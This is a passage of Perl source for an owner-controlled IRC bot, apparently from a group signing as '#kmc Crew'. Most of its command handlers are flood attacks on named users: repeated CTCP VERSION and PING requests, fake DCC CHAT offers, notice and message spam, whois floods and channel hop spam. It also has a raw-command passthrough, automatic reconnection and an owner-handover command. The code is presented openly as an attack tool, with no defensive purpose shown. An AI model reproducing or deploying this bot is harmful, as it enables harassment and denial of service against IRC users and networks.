        if (/^:.+?\s433\s/) { # nick already in use
            $nick2 = $nickname[rand scalar @nickname];
            print $sock "NICK ".$nick2."\n";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock "JOIN $channel\n";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock "PONG :$1\n";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.botku (.*)/){
            print $sock "$1";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.help(.*)/){
            print $sock "PRIVMSG ".$owner." : japraxz\n";
            print $sock "PRIVMSG ".$owner." : #kmc Crew\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : !botku join #chan\n";
            print $sock "PRIVMSG ".$owner." : !botku part #chan\n";
            print $sock "PRIVMSG ".$owner." : !msg nick (nick)\n";
            print $sock "PRIVMSG ".$owner." : .quit\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .ctcpflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .dccflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .noticeflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .msgflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : !hop #chan (pesan)\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.msg(.*)/){
                        print $sock "PRIVMSG ".$1." : ".$2."\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.who(.*)/){
                        print $sock "who ".$channel."\n";
      }
      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
                        my $nicks = $1;
                        #$nicks =~ s/\n//;
                        #$nicks =~ s/\r//;
                        push(@WHO, split(/ /, $nicks));
                        print STDOUT "$who[1]\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.dccflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.whoisflood(.*)/){
                        for (1 .. 5) {
                        print $sock "whois ".$1."\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.hop (.*)/){
                print $sock "JOIN ".$1." : ".$2."\n";
                        for (1 .. 5) {
                        print $sock "PART ".$1." : ".$2."\n";
                        print $sock "JOIN ".$1." : ".$2."\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.ctcpflood(.*)/){
                print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        print $sock "PRIVMSG ".$1." :\001PING\001\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.msgflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :4susumu ngamblehhhhhhh\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.noticeflood(.*)/){
                        for (1 .. 5) {
                        print $sock "NOTICE ".$1." :4susumu ngamblehhhhhh\n";
                        }
      }
      if(/^ERROR :(.*)/){
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.quit(.*)/){
                        die();
      }
      if(/^\:.*: Connection timed out(.*)/){
                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) 

|| exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.FoRbIdDeN^LeGeNd(.*)/){
                        print $sock "PRIVMSG ".$owner." : Bot genol\n";
                        print $sock "PRIVMSG ".$owner." : Using server : $server\n";
                        print $sock "PRIVMSG ".$owner." : Using port   : $port\n";
                        print $sock "PRIVMSG ".$owner." : Using nick   : $nick\n";
                        print $sock "PRIVMSG ".$owner." : Using owner  : $owner\n";
                        print $sock "PRIVMSG ".$owner." : Using ident  : $id\n";
                        print $sock "PRIVMSG ".$owner." : putri-bot\n\n";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:.owner\s+(.*)/ ){
                       $owner =$1;
                       $owner =~ s/ //;
                       $owner =~ s/\r$//;
                       $owner =~ s/\n$//;
       }
   }

exit;
  } 
}





